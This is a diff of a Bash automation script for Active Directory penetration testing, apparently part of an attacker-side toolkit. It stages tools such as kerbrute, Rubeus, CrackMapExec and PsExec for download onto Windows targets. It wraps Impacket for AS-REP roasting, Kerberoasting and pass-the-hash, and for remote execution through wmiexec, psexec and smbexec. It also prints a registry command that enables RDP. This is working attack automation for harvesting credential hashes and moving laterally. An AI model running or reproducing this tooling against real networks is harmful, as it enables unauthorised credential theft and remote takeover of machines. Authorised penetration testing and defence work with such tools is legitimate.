@@ -6,7 +6,7 @@ get_spray_passwords() {
     if [[ ! -f "Spray-Passwords.ps1" ]]; then
         cp $SCRIPTDIR/../ps1/Spray-Passwords.ps1 Spray-Passwords.ps1
     fi
-    generate_iwr Spray-Passwords.ps1
+    generate_windows_download Spray-Passwords.ps1
 
 }
 
@@ -15,7 +15,7 @@ get_kerbrute() {
     if [[ ! -f "kerbrute_windows_amd64.exe" ]]; then
         wget "$kerbrute_url" -O kerbrute_windows_amd64.exe >> $trail_log
     fi
-    generate_iwr kerbrute_windows_amd64.exe
+    generate_windows_download kerbrute_windows_amd64.exe
 }
 
 get_crackmapexec_windows() {
@@ -27,14 +27,14 @@ get_crackmapexec_windows() {
         unzip cme-windows-latest-3.10.1.zip >> $trail_log
         mv cme cme.exe
     fi
-    generate_iwr cme.exe
+    generate_windows_download cme.exe
 }
 
 get_rubeus() {
     if [[ ! -f "Rubeus.exe" ]]; then
         cp /usr/share/windows-resources/rubeus/Rubeus.exe .
     fi
-    generate_iwr Rubeus.exe
+    generate_windows_download Rubeus.exe
 }
 
 perform_kerberoast_rubeus() {
@@ -51,7 +51,7 @@ perform_asrep_roasting() {
         hash_file="hashes.asreproast"
     fi
     output_hashes="true"
-    perform_impacket "impacket-GetNPUsers" "-request"
+    perform_impacket "impacket-GetNPUsers" "-request $1"
 }
 
 perform_impacket_kerberoast() {
@@ -59,7 +59,7 @@ perform_impacket_kerberoast() {
         hash_file="hashes.kerberoast"
     fi
     output_hashes="true"
-    perform_impacket "impacket-GetUserSPNs" "-request"
+    perform_impacket "impacket-GetUserSPNs" "-request $1"
 }
 
 perform_impacket() {
@@ -93,20 +93,18 @@ perform_impacket() {
     else
         proxychain_command=""
     fi
-    local impacket_dc_host=""
     if [[ ! -z "$dc_host" ]]; then
-        impacket_dc_host="-dc-host $dc_host"
+        impacket_command_options="$impacket_command_options -dc-host $dc_host"
     fi
-    local impacket_dc_ip=""
     if [[ ! -z "$dc_ip" ]]; then
-        impacket_dc_ip="-dc-ip $dc_ip"
+        impacket_command_options="$impacket_command_options -dc-ip $dc_ip"
     fi
-    if [[ -z "$impacket_dc_host" ]] && [[ -z "$impacket_dc_ip" ]]; then
+    if [[ -z "$dc_host" ]] && [[ -z "$dc_ip" ]]; then
         echo "No DC host or IP specified. Make sure this is your intention." 
     fi
     local target=$username
     if [[ ! -z "$password" ]]; then
-        target="$target:$password"
+        target="$target:'$password'"
     fi
     if [[ ! -z "$domain" ]]; then
         target="$domain/$target"
@@ -114,10 +112,8 @@ perform_impacket() {
     if [[ ! -z "$target_ip" ]]; then
         target="$target@$target_ip"        
     fi
-    local output_file_option=""
     if [[ ! -z "$output_hashes" ]] && [[ "$output_hashes" == "true" ]]; then
-        output_file_option="-outputfile $hash_file"
-        echo "output_file_option=$output_file_option"
+        impacket_command_options="$impacket_command_options -outputfile $hash_file"
         if [[ -f "$hash_file" ]]; then
             echo "$hash_file already exists, skipping impacket"
             return 0
@@ -125,8 +121,11 @@ perform_impacket() {
     fi
     local hashes_option="" 
     local kerberos_option=""
-    if [[ ! -z "$domain" ]]; then
-        kerberos_option="-k"
+    if [[ ! -z "$KRB5CCNAME" ]]; then
+        if [[ -f "$KRB5CCNAME" ]]; then
+            echo "Using Kerberos ticket cache: $KRB5CCNAME"
+            kerberos_option="-k"
+        fi
     fi
     if [[ ! -z "$ntlm_hash" ]]; then
         if [[ $ntlm_hash == *":"* ]]; then
@@ -136,10 +135,22 @@ perform_impacket() {
         fi
         kerberos_option=""
     fi
+    impacket_command_options="$impacket_command_options $hashes_option $kerberos_option"
+    echo "going to set cmd options"
+    local run_cmd_option=""    
+    if [[ ! -z "$run_cmd" ]] && [[ "$run_cmd" == "true" ]]; then
+        if [[ -z "$cmd" ]]; then
+            echo "Command must be set when run_cmd is true."
+        fi
+        run_cmd_option="$cmd"
+    fi
     echo "target=$target"
-    echo ${proxychain_command}$impacket_command $impacket_command_options $impacket_dc_host $impacket_dc_ip $output_file_option $hashes_option -no-pass $kerberos_option $target
-    ${proxychain_command}$impacket_command $impacket_command_options $impacket_dc_host $impacket_dc_ip $output_file_option $hashes_option -no-pass $kerberos_option $target
-
+    echo ${proxychain_command}$impacket_command $impacket_command_options $target "$run_cmd_option"
+    if [[ -z $run_cmd_option ]]; then
+        eval ${proxychain_command}$impacket_command $impacket_command_options -no-pass $target | tee -a $trail_log
+    else
+        eval ${proxychain_command}$impacket_command $impacket_command_options -no-pass $target \"$run_cmd_option\" | tee -a $trail_log
+    fi
 }
 
 get_silverticket_command() {
@@ -278,7 +289,7 @@ get_psexec() {
     if [[ ! -d "pstools" ]]; then
         unzip -u PSTools.zip -d pstools >> $trail_log
     fi
-    generate_iwr "pstools/$PsExec_exe" "$PsExec_exe"
+    generate_windows_download "pstools/$PsExec_exe" "$PsExec_exe"
 }
 
 run_psexec() { 
@@ -305,8 +316,12 @@ perform_impacket_wmiexec() {
         echo "Username, NTLM hash, and target IP address must be set before running Impacket WMICExec command."
         return 1
     fi
+    if pgrep -f "wmiexec.py .*$target_ip"; then
+        echo "Impacket WMIExec is already running, please stop it first."
+        return 0
+    fi
     output_hashes="false"
-    perform_impacket "impacket-wmiexec"
+    perform_impacket "impacket-wmiexec" "$1"
 }
 
 perform_impacket_psexec() {
@@ -314,9 +329,27 @@ perform_impacket_psexec() {
         echo "Username, NTLM hash, and target IP address must be set before running Impacket PsExec command."
         return 1
     fi
+    if pgrep -f "psexec.py .*$target_ip"; then
+        echo "Impacket PsExec is already running, please stop it first."
+        return 0
+    fi
     output_hashes="false"
-    perform_impacket "impacket-psexec"
+    perform_impacket "impacket-psexec" "$1"
 }
+
+perform_impacket_smbexec() {
+    if [[ -z "$username" ]] || [[ -z "$target_ip" ]]; then
+        echo "Username, NTLM hash, and target IP address must be set before running Impacket SMBExec command."
+        return 1
+    fi
+    if pgrep -f "smbexec.py .*$target_ip"; then
+        echo "Impacket SMBExec is already running, please stop it first."
+        return 0
+    fi
+    output_hashes="false"
+    perform_impacket "impacket-smbexec"
+}
+
 perform_dcom() {
     if [[ -z "$target_ip" ]]; then
         echo "Target IP address must be set before running DCOM command."
@@ -502,3 +535,7 @@ run_evil_winrm() {
     evil-winrm -i "$target_ip" "$username_option" "$password_option" | tee >(remove_color_to_log >> $trail_log)
 
 }   
+
+enable_rdp_commands() {
+    echo 'reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
+}
